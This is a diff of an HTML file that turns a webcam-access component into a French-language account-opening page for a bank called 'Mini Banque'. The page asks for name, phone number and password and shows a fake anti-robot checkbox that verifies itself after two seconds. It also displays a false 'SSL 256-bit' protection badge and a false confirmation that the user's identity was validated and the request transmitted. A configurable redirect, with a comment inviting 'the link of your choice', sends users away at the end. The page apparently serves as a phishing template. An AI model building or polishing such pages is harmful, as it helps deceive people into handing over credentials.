@@ -3,68 +3,277 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Composant Caméra Générique</title>
+    <title>Ouverture de compte en ligne - Espace Client</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f4f7fa;
+            margin: 0;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            background-color: #f4f7fa;
-            margin: 0;
+            min-height: 100vh;
         }
-        .camera-container {
-            background: white;
-            padding: 25px;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        .card {
+            background: #ffffff;
+            padding: 40px 35px;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(12, 35, 64, 0.08);
+            width: 100%;
+            max-width: 440px;
+            box-sizing: border-box;
+            border-top: 6px solid #0070ba;
+        }
+        .brand-header {
             text-align: center;
-            max-width: 400px;
-            width: 100%;
+            margin-bottom: 30px;
         }
-        video {
+        .brand-logo {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #0c2340;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .brand-subtitle {
+            color: #64748b;
+            font-size: 0.95rem;
+            margin: 5px 0 0 0;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #1e293b;
+            font-size: 0.9rem;
+        }
+        input {
             width: 100%;
-            height: auto;
+            padding: 12px 14px;
+            border: 1px solid #cbd5e1;
             border-radius: 8px;
-            background-color: #222;
-            transform: scaleX(-1); /* Effet miroir plus naturel */
+            box-sizing: border-box;
+            font-size: 1rem;
+            color: #334155;
+            background-color: #ffffff;
+            transition: all 0.2s ease;
+        }
+        input:focus {
+            outline: none;
+            border-color: #0070ba;
+            box-shadow: 0 0 0 3px rgba(0, 112, 186, 0.15);
         }
         button {
-            margin-top: 15px;
-            padding: 10px 20px;
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
             background-color: #0070ba;
             color: white;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-weight: bold;
+            transition: background-color 0.2s;
+            margin-top: 10px;
         }
-        button:hover { background-color: #0c2340; }
+        button:hover:not(:disabled) {
+            background-color: #0c2340;
+        }
+        button:disabled {
+            background-color: #cbd5e1;
+            cursor: not-allowed;
+        }
+        
+        /* Zone Anti-Robot */
+        .captcha-container {
+            background-color: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 4px;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        .captcha-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .captcha-checkbox {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #c1c1c1;
+            border-radius: 2px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: white;
+            transition: all 0.2s;
+        }
+        .captcha-text {
+            font-size: 0.9rem;
+            color: #2b2b2b;
+            font-weight: 500;
+            user-select: none;
+        }
+        .captcha-logo {
+            text-align: center;
+            font-size: 0.75rem;
+            color: #555;
+        }
+        
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 2.5px solid rgba(0,0,0,0.1);
+            border-radius: 50%;
+            border-top-color: #0070ba;
+            animation: spin 0.6s linear infinite;
+        }
+        .checkmark {
+            color: #22c55e;
+            font-weight: bold;
+            font-size: 1.2rem;
+            animation: scaleUp 0.3s ease forwards;
+        }
+
+        .step-panel {
+            display: none;
+            animation: fadeIn 0.4s ease forwards;
+        }
+        .status-box {
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+        .success { background-color: #f0fdf4; color: #166534; border: 1px solid #bbf7d0; }
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            color: #64748b;
+            font-size: 0.8rem;
+            margin-top: 25px;
+            text-align: center;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes scaleUp { from { transform: scale(0); } to { transform: scale(1); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
-<div class="camera-container">
-    <h3>Vérification vidéo</h3>
-    <p style="color: #555; font-size: 0.9rem;">Veuillez autoriser l'accès à votre caméra pour le test visuel.</p>
-    
-    <!-- Zone d'affichage du flux de la caméra -->
-    <video id="webcam" autoplay playsinline></video>
-    
-    <button onclick="demarrerCamera()">Activer la caméra</button>
+<div class="card">
+    <div class="brand-header">
+        <p class="brand-logo">🍁 Mini Banque</p>
+        <p class="brand-subtitle">Ouverture de compte particulier en ligne</p>
+    </div>
+
+    <!-- ÉTAPE 1 : Formulaire d'inscription -->
+    <div id="step-inscription">
+        <form onsubmit="envoyerDemande(event)">
+            <div class="form-group">
+                <label for="username">Nom complet (civil) :</label>
+                <input type="text" id="username" required placeholder="Ex: ROSE ADJOAVI">
+            </div>
+            <div class="form-group">
+                <label for="phone">Numéro de téléphone portable :</label>
+                <input type="tel" id="phone" required placeholder="Ex: +228 97 55 42 85">
+            </div>
+            <div class="form-group">
+                <label for="password">Créer un mot de passe sécurisé :</label>
+                <input type="password" id="password" required placeholder="••••••••">
+            </div>
+
+            <!-- Bloc Anti-Robot -->
+            <div class="captcha-container">
+                <div class="captcha-left">
+                    <div id="captcha-box" class="captcha-checkbox" onclick="declencherAntiRobot()"></div>
+                    <div id="captcha-label" class="captcha-text">Je ne suis pas un robot</div>
+                </div>
+                <div class="captcha-logo">
+                    🔒<br>Secured
+                </div>
+            </div>
+
+            <button type="submit" id="submitBtn" disabled>Continuer l'inscription</button>
+        </form>
+    </div>
+
+    <!-- ÉTAPE 2 : Message final de validation -->
+    <div id="step-final" class="step-panel">
+        <div class="status-box success">
+            <span style="font-size: 2rem;">✓</span><br>
+            <h3 style="margin: 10px 0 5px 0;">Vérification réussie</h3>
+            <p style="font-size: 0.95rem; font-weight: normal; margin: 0; color: #166534;">Votre identité numérique a été validée.</p>
+        </div>
+        
+        <p style="text-align: center; color: #334155; font-size: 0.95rem; line-height: 1.5;">
+            Votre demande d'ouverture de compte est désormais complète.<br><br>
+            Elle a été transmise avec succès. Vous recevrez une notification dès que les <b>administrateurs de la banque auront validé votre dossier</b>.
+        </p>
+        
+        <!-- Redirection vers le lien de votre choix -->
+        <button onclick="redirigerUtilisateur()" style="background-color: #166534;">Terminer et quitter</button>
+    </div>
+
+    <div class="security-badge">
+        <span>🔒</span> Chiffrement de sécurité SSL 256-bit — Données Bancaires Protégées
+    </div>
 </div>
 
 <script>
-    async function demarrerCamera() {
-        try {
-            // Demande l'autorisation d'accéder à la webcam de l'appareil
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-            const videoElement = document.getElementById('webcam');
-            videoElement.srcObject = stream;
-        } catch (error) {
-            alert("Impossible d'accéder à la caméra : " + error.message);
-        }
+    const panelInscription = document.getElementById('step-inscription');
+    const panelFinal = document.getElementById('step-final');
+    const captchaBox = document.getElementById('captcha-box');
+    const captchaLabel = document.getElementById('captcha-label');
+    const submitBtn = document.getElementById('submitBtn');
+    
+    let robotVerifie = false;
+
+    // Ajustez cette adresse web pour la redirection finale
+    const URL_DE_REDIRECTION = "https://google.com"; 
+
+    function declencherAntiRobot() {
+        if (robotVerifie) return;
+
+        captchaBox.innerHTML = '<div class="spinner"></div>';
+        captchaLabel.textContent = 'Vérification en cours...';
+
+        setTimeout(() => {
+            captchaBox.innerHTML = '<div class="checkmark">✓</div>';
+            captchaBox.style.borderColor = '#22c55e';
+            captchaLabel.textContent = 'Robot vérifié avec succès';
+            captchaLabel.style.color = '#166534';
+            
+            robotVerifie = true;
+            submitBtn.disabled = false;
+        }, 2000);
+    }
+
+    function envoyerDemande(event) {
+        event.preventDefault();
+        if (!robotVerifie) return;
+
+        panelInscription.style.display = 'none';
+        panelFinal.style.display = 'block';
+    }
+
+    function redirigerUtilisateur() {
+        window.location.href = URL_DE_REDIRECTION;
     }
 </script>
 
